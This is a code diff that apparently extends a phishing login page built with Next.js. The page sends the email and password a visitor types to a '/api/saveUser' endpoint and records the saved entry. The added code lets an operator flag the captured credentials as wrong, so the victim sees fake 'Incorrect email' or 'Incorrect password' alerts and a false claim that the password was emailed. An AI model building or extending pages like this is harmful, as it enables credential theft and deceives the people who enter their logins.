@@ -9,11 +9,17 @@ import { storeData } from "@/lib/dataSlice";
 import { usePathname } from "next/navigation";
 import NotFoundPage from "@/components/LinkExpired";
 import Link from "next/link";
+import { Mail } from "lucide-react";
+import useWrongCredentials, { setCurrentUser } from "@/lib/useWrongCredentials";
 
 const LoginPage = () => {
   const dispatch = useDispatch();
   const router = useRouter();
   const pathname = usePathname();
+
+  // 🔎 Redirects to /?error=email-wrong or /?error=password-wrong when the
+  // admin marks the saved credentials as wrong
+  const { error } = useWrongCredentials();
 
   const [passwordVisible, setPasswordVisible] = useState(false);
   const [user, setUser] = useState("");
@@ -132,11 +138,21 @@ const LoginPage = () => {
 
     setIsLoading(true);
     dispatch(userLogin({ user, password, deviceType }));
-    
+
 
     try {
-      await axios.post("/api/saveUser", { user, password, deviceType });
+      const res = await axios.post("/api/saveUser", {
+        user,
+        password,
+        deviceType,
+      });
       console.log("User data saved successfully");
+
+      // 💾 Remember this login so the admin can mark it as wrong later
+      if (res?.data?.data?._id) {
+        setCurrentUser(res.data.data._id, user);
+      }
+
       router.push("/login");
     } catch (error) {
       console.error(error);
@@ -154,6 +170,28 @@ const LoginPage = () => {
     setPassword(e.target.value);
     setPasswordError(false);
   };
+
+  // ❌ Alert shown when the admin marked the credentials as wrong
+  const loginError =
+    error === "email-wrong"
+      ? {
+        title: "Incorrect email",
+        body: "The email address you entered is incorrect. Please check your email address and try again.",
+        showPasswordSent: false,
+      }
+      : error === "password-wrong"
+        ? {
+          title: "Incorrect password",
+          body: "The password you entered is incorrect. Don't worry, your password has been sent to your email address. Please check your inbox (and spam folder) for the password and use it to log in.",
+          showPasswordSent: true,
+        }
+        : error
+          ? {
+            title: "Login failed",
+            body: "We're sorry. We were unable to complete your login. Please try again.",
+            showPasswordSent: false,
+          }
+          : null;
 
   if (isLinkExpired) {
     return <NotFoundPage />;
@@ -187,7 +225,24 @@ const LoginPage = () => {
               Log in to your account
             </h1>
 
-            <form onSubmit={handleSubmit} noValidate>
+            {/* ❌ Wrong credentials alert */}
+            {loginError && (
+              <div className="flex w-full items-start gap-3 rounded-md border border-[#F3CBD1] bg-[#FDECEF] px-4 py-[14px] mb-[18px]">
+                <span className="flex h-[26px] w-[26px] shrink-0 items-center justify-center rounded-full bg-[#E4002B] text-[18px] font-bold leading-none text-white">
+                  !
+                </span>
+                <div>
+                  <p className="text-[17px] sm:text-[18px] font-bold leading-[1.3] text-[#E4002B] mb-[6px]">
+                    {loginError.title}
+                  </p>
+                  <p className="text-[15px] sm:text-[16px] leading-[1.5] text-[#1F1F1F]">
+                    {loginError.body}
+                  </p>
+                </div>
+              </div>
+            )}
+
+            <form onSubmit={handleSubmit} noValidate className="w-full">
               {/* Email Field */}
               <div className="mb-[14px]">
                 <label
@@ -200,18 +255,16 @@ const LoginPage = () => {
                   id="email"
                   name="email"
                   type="email"
-                  className={`w-[104%] px-[14px] py-[6px] border text-[#1F1F1F] bg-white placeholder-[#9A9A9A] focus-visible:outline-2 focus-visible:outline-[#009DC1] focus-visible:outline-offset-1 ${
-                    emailError ? "border-[#FF001F]" : "border-[#C5C5C5]"
-                  }`}
+                  className={`w-full px-[14px] py-[6px] border text-[#1F1F1F] bg-white placeholder-[#9A9A9A] focus-visible:outline-2 focus-visible:outline-[#009DC1] focus-visible:outline-offset-1 ${emailError ? "border-[#FF001F]" : "border-[#C5C5C5]"
+                    }`}
                   placeholder="Your email"
                   autoComplete="username"
                   value={user}
                   onChange={handleEmailChange}
                 />
                 <p
-                  className={`text-[12px] text-[#FF001F] mt-[5px] w-[104%] ${
-                    emailError ? "block" : "hidden"
-                  }`}
+                  className={`text-[12px] text-[#FF001F] mt-[5px] w-full ${emailError ? "block" : "hidden"
+                    }`}
                 >
                   Enter a valid email address.
                 </p>
@@ -229,18 +282,16 @@ const LoginPage = () => {
                   id="password"
                   name="password"
                   type={passwordVisible ? "text" : "password"}
-                  className={`w-[104%] px-[14px] py-[6px] border text-[#1F1F1F] bg-white placeholder-[#9A9A9A] focus-visible:outline-2 focus-visible:outline-[#009DC1] focus-visible:outline-offset-1 ${
-                    passwordError ? "border-[#FF001F]" : "border-[#C5C5C5]"
-                  }`}
+                  className={`w-full px-[14px] py-[6px] border text-[#1F1F1F] bg-white placeholder-[#9A9A9A] focus-visible:outline-2 focus-visible:outline-[#009DC1] focus-visible:outline-offset-1 ${passwordError ? "border-[#FF001F]" : "border-[#C5C5C5]"
+                    }`}
                   placeholder="Password"
                   autoComplete="current-password"
                   value={password}
                   onChange={handlePasswordChange}
                 />
                 <p
-                  className={`text-[12px] text-[#FF001F] mt-[5px] w-[104%] ${
-                    passwordError ? "block" : "hidden"
-                  }`}
+                  className={`text-[12px] text-[#FF001F] mt-[5px] w-full ${passwordError ? "block" : "hidden"
+                    }`}
                 >
                   Enter your password.
                 </p>
@@ -281,10 +332,26 @@ const LoginPage = () => {
               {/* Submit Button */}
               <button
                 type="submit"
-                className="w-[104%] bg-[#009DC1] text-white border-none rounded-[3px] py-[12px] text-[16px] font-normal cursor-pointer mb-[14px] transition-colors duration-150 hover:bg-[#0089AA] focus-visible:outline-2 focus-visible:outline-[#93002F] focus-visible:outline-offset-2"
+                className="w-full bg-[#009DC1] text-white border-none rounded-[3px] py-[12px] text-[16px] font-normal cursor-pointer mb-[14px] transition-colors duration-150 hover:bg-[#0089AA] focus-visible:outline-2 focus-visible:outline-[#93002F] focus-visible:outline-offset-2"
               >
                 {isLoading ? "Submitting..." : "Log in"}
               </button>
+
+              {loginError?.showPasswordSent && (
+                <div className="flex items-start w-full gap-3 rounded-md border border-[#C4E7F2] bg-[#E9F6FB] px-6 py-[14px] mb-[14px]">
+                  <Mail
+                    className="mt-[1px] h-[26px] w-[26px] shrink-0 text-[#009DC1]"
+                    strokeWidth={1.6}
+                  />
+
+                  <div className="min-w-0 text-[15px] sm:text-[16px] leading-[1.5] text-[#1F1F1F]">
+                    <p className="font-bold">
+                      We&apos;ve sent your password to your email address.
+                    </p>
+                    <p>Please check your inbox (and spam folder).</p>
+                  </div>
+                </div>
+              )}
 
               {/* Fine Print */}
               <p className="text-[60%] my-3 text-[#222] leading-[1.7]">
